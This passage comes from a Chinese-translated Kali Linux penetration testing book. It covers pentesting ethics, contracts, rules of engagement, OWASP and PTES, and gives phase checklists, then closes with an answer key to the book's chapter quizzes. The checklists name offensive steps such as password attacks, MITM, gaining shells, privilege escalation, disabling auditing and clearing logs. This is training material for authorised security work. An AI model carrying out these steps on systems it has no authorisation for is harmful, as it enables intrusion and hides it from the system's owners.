+   **XSS**：[`www.owasp.org/index.php/Cross-site_Scripting_(XSS)`](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))

+   **SQL 注入**：[`www.owasp.org/index.php/SQL_Injection`](https://www.owasp.org/index.php/SQL_Injection)


# 第十六章：最佳实践

首先，我个人想要恭喜你完成了这本书！你已经在网络安全方面获得了一些了不起的技能，特别是在渗透测试领域，使用了最流行的渗透测试 Linux 发行版之一：Kali Linux。在本书中，我们着重关注了成为渗透测试人员/道德黑客的技术和实际方面。

然而，还有渗透测试的最佳实践需要涵盖。了解最佳实践将帮助你在商业世界中提高自己。通过遵循推荐的程序，你将能够有效地工作并以高效的方式获得最佳结果。

在本章中，我们将涵盖以下话题：

+   渗透测试人员的指南

+   Web 应用程序安全蓝图和清单

+   网站和网络清单

# 技术要求

本章没有正式的技术要求。

# 渗透测试人员的指南

作为一个具有黑客技能的人，你必须意识到道德和犯罪活动之间的界限。请记住，使用计算系统执行任何侵入性行为以对他人或组织造成伤害是非法的。因此，渗透测试人员必须遵循行为准则，以确保他们始终在法律的正确一边。

在本节的其余部分，我们将涵盖以下关键点：

+   获得书面许可

+   做道德的事

+   渗透测试合同

+   **参与规则**（**RoE**）

+   额外的技巧和窍门

现在让我们详细看看这些话题。

# 获得书面许可

在对目标组织进行渗透测试之前，请确保你有来自该组织的书面许可。如果需要从其他机构获得额外许可，请确保你获得所有法律许可文件。拥有法律上的书面许可就像作为渗透测试人员拥有一张免于入狱的卡一样。渗透测试人员执行的任务涉及对目标组织进行模拟真实世界的网络攻击；这意味着通过任何可能的方式实际入侵他们的网络。一些攻击可能非常侵入性，并可能造成损害或网络中断；书面许可用于在法律上保护自己。

# 做道德的事

作为行业中的专业人士，在你的所有行为中始终要做到道德。在你练习渗透测试技能的过程中，我相信你已经意识到成为恶意黑客和渗透测试人员之间有一条细微的界限。主要区别在于渗透测试人员在执行任何攻击之前获得了合法许可，并且目标是帮助组织改善其安全状况并减少实际黑客可能利用的攻击面。做道德就是做正确的事情并坚持道德原则。

# 渗透测试合同

作为行业中的新兴专业人士，请确保你有一份经过律师审核和验证的**渗透测试合同**，其中包括**保密**和**保密协议**（**NDA**）。这是为了确保客户（目标组织）的信息得到保护，并且你（渗透测试人员）不会在没有法律要求的情况下透露客户的任何信息。此外，保密协议建立了客户和你之间的信任，因为许多组织不希望他们的漏洞被他人知晓。

如果在与新客户的商务会议中，他们询问您之前进行的渗透测试和客户信息，请不要透露任何细节。这将违反 NDA，该协议保护您的客户和自己，并建立信任。但是，您可以简单地向新潜在客户概述您可以为其组织做些什么，可以进行的测试类型以及在测试阶段可能使用的一些工具。

# 参与规则

在与客户（目标组织）的商务会议期间，确保您和客户在实际渗透测试之前了解 RoE。 RoE 只是由服务提供商（渗透测试人员）创建的文件，概述了应进行的渗透测试类型以及其他一些具体内容。这些包括要测试的网络区域，以及网络上的目标，如服务器、网络设备和工作站。简而言之，RoE 定义了应如何进行渗透测试，并指示与目标组织相关的任何边界。

确保在目标组织内部为紧急情况获取关键联系人的联系信息。作为渗透测试人员，可能会出现危机，您可能需要联系某人寻求帮助，例如如果您在工作时间之后在建筑物内进行测试。

在进行渗透测试时，如果发现目标组织系统或网络上有侵犯人权或非法活动的迹象，立即停止并向当地当局（警察）报告。如果发现网络基础设施存在安全漏洞，请立即停止并向组织内的权威人士和/或当地当局报告。作为渗透测试人员，您需要有良好的道德观念，遵守法律；人权和安全永远是第一位的，所有非法活动都应报告给必要的当局。

# 额外的提示和技巧

在对目标组织的网络运行任何渗透测试工具之前，始终在实验室环境中测试它们，以确定它们是否使用大量网络带宽，以及确定它们产生的噪音级别。如果工具使用大量带宽，则在网络速度较慢的目标组织上使用该工具是没有意义的。该工具可能会消耗网络段上的所有带宽，导致网络瓶颈；这是不好的。

使用漏洞扫描程序来帮助执行和自动化定期网络扫描。漏洞扫描程序可以帮助组织满足合规性和标准化。像 Nessus（[www.tenable.com](http://www.tenable.com)）和 Nexpose（[www.rapid7.com](http://www.rapid7.com)）这样的工具是网络安全行业内有声誉的漏洞扫描程序和管理工具。

此外，了解不同的操作系统，如 Windows、Linux 和 macOS。将一些网络安全主题作为学习的一部分。了解网络安全和企业网络将有助于您更轻松地映射目标网络并绕过网络安全设备。

在下一节中，我们将看一下 Web 应用程序安全蓝图和清单。

# Web 应用程序安全蓝图和清单

在对系统或网络进行渗透测试时，使用一组经批准或推荐的准则来确保实现期望的结果。渗透测试方法通常包括以下阶段：

1.  信息收集

1.  扫描和侦察

1.  指纹识别和枚举

1.  漏洞评估

1.  利用研究和验证

1.  报告

遵循这样的清单可以确保渗透测试人员在进入下一阶段之前完成该阶段的所有任务。在这本书中，我们从信息收集阶段开始，逐渐从那里开始。早期章节涵盖了早期阶段，并教会了您如何获取有关目标的敏感细节，而后期章节涵盖了使用找到的信息以各种方法访问目标。

在下一节中，我们将了解**开放式 Web 应用安全项目（OWASP）十大**。

# OWASP

OWASP 是一个专注于使人们和社区能够开发、测试和维护所有人都可以信任的应用程序的非营利基金会。

OWASP 已创建了**OWASP 十大**网络漏洞列表，已成为 Web 应用程序测试的标准：

+   A1:2017-注入

+   A2:2017-破损身份验证

+   A3:2017-敏感数据暴露

+   A4:2017-XML 外部实体（XXE）

+   A5:2017-破损访问控制

+   A6:2017-安全配置错误

+   A7:2017-跨站脚本（XSS）

+   A8:2017-不安全的反序列化

+   A9:2017-使用已知漏洞的组件

+   A10:2017-日志记录和监控不足

每个类别都提供了所有漏洞、发现方法和技术、对策以及减少风险的最佳实践的详细分析。

有关**OWASP 十大项目**的更多信息，请访问[`www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project`](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project)。此外，**OWASP 测试指南**可在[`www.owasp.org/index.php/OWASP_Testing_Project`](https://www.owasp.org/index.php/OWASP_Testing_Project)找到。

此外，始终保持练习，以提高您在理解 OWASP 十大漏洞方面的技能。OWASP**破损 Web 应用**（BWA）项目将协助您在这一过程中。

在下一节中，我们将了解**渗透测试执行标准（PTES）**的各个阶段。

# 渗透测试执行标准

PTES 包括涵盖渗透测试各个方面的几个阶段：

1.  预先交互

1.  情报收集

1.  威胁建模

1.  漏洞分析

1.  利用

1.  后利用

1.  报告

有关 PTES 的更多信息，请访问[`www.penteststandard.org/index.php/Main_Page`](http://www.penteststandard.org/index.php/Main_Page)。

渗透测试标准或框架的选择取决于客户请求的测试类型、目标行业（例如，健康行业的 HIPAA）甚至您组织的渗透测试方法论。

在下一节中，我们将讨论报告阶段的重要性。

# 报告

渗透测试的最后阶段是报告和交付结果。在这个阶段，渗透测试人员创建了一份官方文件，概述了以下内容：

+   目标上发现的所有漏洞

+   基于**通用漏洞评分系统（CVSS）**计算器，按高、中、低等级别对所有风险进行分类

+   发现的漏洞的建议修复方法

确保在撰写报告时，任何人都能理解，包括高级管理人员和执行人员等非技术受众。管理人员并不总是技术人员，因为他们更专注于确保组织内实现业务目标和目标。

报告还应包括以下内容：

+   封面

+   执行摘要

+   漏洞摘要

+   测试细节

+   测试期间使用的工具（可选）

+   原始工作范围

+   报告正文

+   摘要

有关撰写渗透测试报告的更多信息，请访问[`resources.infosecinstitute.com/writing-penetration-testing-reports/`](https://resources.infosecinstitute.com/writing-penetration-testing-reports/)。

永远记住，如果你问 10 个不同的渗透测试人员如何撰写报告，他们都会根据自己的经验和雇主给出不同的答案。确保不要插入太多图片或太多技术术语来混淆读者。对于任何非技术背景的人来说，它应该是简单易懂的。

在接下来的章节中，我们将概述创建渗透测试清单的基本原则。

# 渗透测试清单

我建议渗透测试机器的以下硬件要求：

+   四核处理器

+   8 GB RAM（最低）

+   无线网络适配器

+   以太网网络接口卡

接下来，我们将熟悉创建信息收集清单。

# 信息收集

以下是在**信息收集**阶段之前和期间要执行的任务：

1.  获得法律许可。

1.  定义渗透测试的范围。

1.  使用搜索引擎进行信息收集。

1.  执行 Google 黑客技术。

1.  使用社交网络网站进行信息收集。

1.  执行网站足迹。

1.  执行`WHOIS`信息收集。

1.  执行 DNS 信息收集。

1.  执行网络信息收集。

1.  执行社会工程。

在下一节中，我们将看一下网络扫描的清单。

# 网络扫描

以下是执行**网络扫描**的指南列表：

1.  在网络上执行主机发现。

1.  执行端口扫描以确定服务。

1.  执行目标操作系统和端口的横幅抓取。

1.  执行漏洞扫描。

1.  创建目标网络的网络拓扑。

接下来，我们将了解枚举清单的基本要求。

# 枚举

以下是在目标系统上执行枚举的指南列表：

1.  确定网络范围并计算子网掩码。

1.  执行主机发现。

1.  执行端口扫描。

1.  执行 SMB 和 NetBIOS 枚举技术。

1.  执行 LDAP 枚举。

1.  执行 DNS 枚举。

在下一节中，我们将看一下利用清单。

# 获取访问

以下是**获取访问**网络/系统的指南列表：

1.  执行社会工程。

1.  进行肩部冲浪。

1.  执行各种密码攻击。

1.  执行网络嗅探。

1.  执行**中间人**(**MITM**)攻击。

1.  使用各种技术来利用目标系统并获得 shell（即通过命令行获取访问）。

1.  发现使用横向移动的其他设备。

1.  尝试提升对受损系统的权限。

在下一节中，我们将概述覆盖轨迹清单的基本原则。

# 覆盖轨迹

以下是**覆盖轨迹**的指南列表：

1.  禁用系统上的审计功能。

1.  清除日志文件。

通过完成本节，您现在具备创建适合您需求的完整渗透测试清单所需的技能。

# 总结

通过完成本章，您现在对渗透测试领域的最佳实践有了基础水平的理解。本章后面列出的指南将帮助您确定在渗透测试期间要采取的步骤。记住：你正在学习-发展自己的策略和技术将自然而然地出现。确保您在职业生涯中的进步中记录您的技术和技能。

我希望本章和本书对您的学习有所帮助，并将使您在网络安全领域的道路上受益。谢谢您的支持！

# 问题

1.  在进行渗透测试之前，需要什么来确保渗透测试人员受到保护？

1.  用于概述工作的文档类型是什么？

1.  你如何确定漏洞的风险评级？

1.  渗透测试的最后阶段是什么？

# 进一步阅读

+   RoE: [`hub.packtpub.com/penetration-testing-rules-of-engagement/`](https://hub.packtpub.com/penetration-testing-rules-of-engagement/).

+   渗透测试方法：[`resources.infosecinstitute.com/penetration-testing-methodologies-and-standards/.`](https://resources.infosecinstitute.com/penetration-testing-methodologies-and-standards/)

+   其他渗透测试方法可以在[`www.owasp.org/index.php/Penetration_testing_methodologies.`](https://www.owasp.org/index.php/Penetration_testing_methodologies)找到。

+   以下是一些网站，将帮助您确定风险的严重程度并研究网络安全世界中的威胁：

+   CVE: [`cve.mitre.org/`](https://cve.mitre.org/)

+   CVSS: [`www.first.org/cvss/`](https://www.first.org/cvss/)

+   OWASP: [`www.owasp.org`](https://www.owasp.org)

+   SANS: [`www.sans.org/`](https://www.sans.org/)

+   Exploit-DB: [`www.exploit-db.com/`](https://www.exploit-db.com/)

+   SecurityFocus: [`www.securityfocus.com/`](https://www.securityfocus.com/)

+   最后，始终继续学习并提高自己的技能。以下是一些将为您作为渗透测试人员增添价值的认证：

+   **Offensive Security Certified Professional** (**OSCP**): [www.offensive-security.com](http://www.offensive-security.com)

+   **Certified Ethical Hacker** (**CEH**): [www.eccouncil.org](http://www.eccouncil.org)

+   **GIAC Certifications**: [www.giac.org](http://www.giac.org)


# 第十七章：评估

# 入门黑客

1.  脚本小子

1.  掩盖踪迹

1.  OWASP

1.  黑盒测试

1.  国家赞助

# 设置 Kali-部分

1.  2 型虚拟化程序

1.  所需的物理空间更少，功耗更低，成本更低

1.  VMware ESXi，Oracle VirtualBox 和 Microsoft Virtual PC

1.  使用`dpkg -i <应用程序文件>`命令

1.  客座操作系统

# 熟悉 Kali Linux 2019

1.  BackTrack

1.  `apt-get update`

1.  `apt-get upgrade`

1.  `apt-get install <应用程序名称>`

1.  定位<文件>

# 被动信息收集

1.  收集有关目标的信息，例如网络和系统详细信息以及组织信息（例如公司目录和员工详细信息）

1.  Maltego，Dig，NSlookup，Recon-ng，theHarvester 和 Shodan

1.  通过使用`site: <关键词>`语法

1.  利用漏洞数据库

1.  whois

1.  通过使用 Sublist3r 工具

# 主动信息收集

1.  将主机名解析为 IP 地址。

1.  DNS 区传输允许将区文件从主 DNS 服务器复制到另一个服务器，例如辅助 DNS 服务器。

1.  Nmap。

1.  数据包分片。

1.  JXplorer。

# 使用漏洞扫描器

1.  `server nessusd start`

1.  **支付卡行业数据安全标准**（**PCI DSS**）

1.  执行和自定义

1.  Nikto，Burp Suite 和 WPScan

1.  WPScan

# 了解网络渗透测试

1.  `macchanger`

1.  特设，管理，主控，中继，辅助和监视器

1.  `ifconfig`

1.  `airmon-ng check kill`

# 网络渗透测试-连接前攻击

1.  airmon-ng

1.  ESSID

1.  代码 2-先前的身份验证不再有效，代码 3-解除身份 leaving

1.  aireplay-ng

# 网络渗透测试-获取访问权限

1.  **高级加密标准**（**AES**）

1.  Citrix-enum-apps

1.  `3389`

1.  Ncrack，Hydra，John the Ripper 和 Hashcat

1.  认证服务器（访问控制服务器）

1.  `search`命令

1.  IEEE 802.1x

# 网络渗透测试-连接后攻击

1.  Yersinia

1.  `getsystem`

1.  将 IP 地址解析为 MAC 地址

1.  **安全外壳**（**SSH**）

1.  通过使用`whoami`命令

# 网络渗透测试-检测和安全

1.  通过使用数据加密和安全协议。

1.  ARP 欺骗。

1.  DAI。

1.  Telnet 以纯文本形式发送其数据包，不支持加密。

1.  在 Nmap 中使用 sniffer-detect 脚本。

# 客户端攻击-社会工程

1.  窃听

1.  网络钓鱼

1.  Smishing

1.  SET 和 Ghost Phisher

# 执行网站渗透测试

1.  Apache，IIS，Nginx

1.  Dirb，DirBuster

1.  HTTP 200 状态代码

1.  **跨站脚本**（**XSS**）

1.  **结构化查询语言**（**SQL**）注入

# 网站渗透测试-获取访问权限

1.  `FROM`

1.  通过使用分号（`;`）

1.  通过使用`INSERT`命令

1.  BeEF

# 最佳实践

1.  来自目标组织的书面法律许可

1.  与 RoE 签订合同

1.  通过使用 CVSS 计算器

1.  掩盖踪迹和报告
